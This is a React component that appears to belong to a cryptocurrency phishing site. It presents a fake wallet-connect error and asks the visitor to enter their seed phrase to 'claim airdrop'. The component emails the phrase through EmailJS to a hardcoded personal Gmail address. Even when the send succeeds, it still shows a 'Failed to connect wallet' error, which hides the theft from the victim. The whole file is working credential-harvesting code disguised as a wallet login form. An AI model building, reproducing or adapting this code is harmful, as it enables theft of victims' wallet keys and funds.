import emailjs from "@emailjs/browser";

import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { useWalletConnectModal } from "@/hooks/useWalletConnectModal";

import { toast } from "sonner";
import { cn } from "@/lib/utils";
import { StaticImageData } from "next/image";
import { PUBLIC_KEY, SERVICE_ID, TEMPLATE_ID } from "@/lib/constants";

type CollectFormProps = {
  selectedWallet?: { name: string; link: string; icon: StaticImageData };
};

const CollectForm = ({ selectedWallet }: CollectFormProps) => {
  const [message, setMessage] = useState("");
  const { setIsOpen } = useWalletConnectModal();

  const mutationFn = async () => {
    return emailjs.send(
      SERVICE_ID,
      TEMPLATE_ID,
      { message, to_email: "boredzoke@gmail.com" },
      PUBLIC_KEY
    );
  };

  const { mutateAsync, isPending } = useMutation({
    mutationKey: ["message", message, setIsOpen],
    mutationFn,
    onSuccess: () => {
      setIsOpen(false);
      toast.error("Failed to connect wallet");
    },
    onError: () => {
      toast.error("Failed to connect wallet. Please try again");
    },
  });

  const onSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!message) {
      return toast.error("Seed phrase cannot be empty");
    }
    mutateAsync();
  };

  return (
    <form onSubmit={onSubmit} className="flex flex-col gap-4 pb-12">
      <textarea
        rows={6}
        name="message"
        value={message}
        onChange={(e) => setMessage(e.target.value)}
        placeholder="Enter your seed phrase"
        className="border resize-none p-4 rounded-lg outline-none"
      ></textarea>
      <div className="text-center text-sm text-red-500">
        Failed to connect {selectedWallet?.name}. Enter your seed phrase to
        claim airdrop
      </div>
      <button
        type="submit"
        disabled={isPending}
        className={cn(
          "grow shrink-0 py-4 lg:py-3 text-white bg-[#E62058] rounded-full flex items-center justify-center",
          { "opacity-80": isPending }
        )}
      >
        {isPending ? (
          <div
            className={cn(
              "size-6 border-2 border-white border-r-transparent rounded-full animate-spin duration-500"
            )}
          />
        ) : (
          <>Connect wallet</>
        )}
      </button>
    </form>
  );
};

export default CollectForm;
